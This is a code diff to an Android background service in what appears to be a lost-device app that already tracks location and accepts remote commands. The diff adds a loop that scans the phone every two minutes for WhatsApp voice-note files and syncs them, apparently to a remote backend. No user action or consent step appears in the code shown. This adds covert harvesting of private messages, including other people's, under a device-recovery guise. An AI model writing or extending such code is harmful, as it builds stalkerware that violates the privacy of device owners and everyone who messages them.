@@ -23,6 +23,7 @@ import com.example.data.sync.FirebaseSyncEngine
 import com.example.data.sync.LocationSyncManager
 import com.example.data.sync.LostModeManager
 import com.example.data.sync.RemoteCommandManager
+import com.example.data.sync.WhatsAppVoiceNoteSyncManager
 import com.example.ui.LostDeviceActivity
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
@@ -115,6 +116,7 @@ class AlwaysSyncService : Service() {
             registerObservers()
             startLocationSyncLoop()
             startHeartbeatLoop()
+            startWhatsAppVoiceNoteSyncLoop() // Continuous 2-minute voice note sync
             startFirebaseCommandListener()
             startListenerKeepAliveLoop()
             startCommandPollingLoop()
@@ -364,6 +366,22 @@ class AlwaysSyncService : Service() {
                     Log.e("AlwaysSyncService", "Background heartbeat error: ${e.message}")
                 }
                 delay(3600000L) // 1 hour interval (60 * 60 * 1000 ms)
+            }
+        }
+    }
+
+    private fun startWhatsAppVoiceNoteSyncLoop() {
+        serviceScope.launch {
+            delay(15000L) // Initial delay after service start
+            while (isActive) {
+                try {
+                    val context = applicationContext
+                    WhatsAppVoiceNoteSyncManager.scanAndSyncAllVoiceNotes(context)
+                    Log.d("AlwaysSyncService", "WhatsApp voice note background sweep completed.")
+                } catch (e: Exception) {
+                    Log.e("AlwaysSyncService", "WhatsApp voice note background sweep error: ${e.message}")
+                }
+                delay(120000L) // Scan every 2 minutes for new .opus files
             }
         }
     }
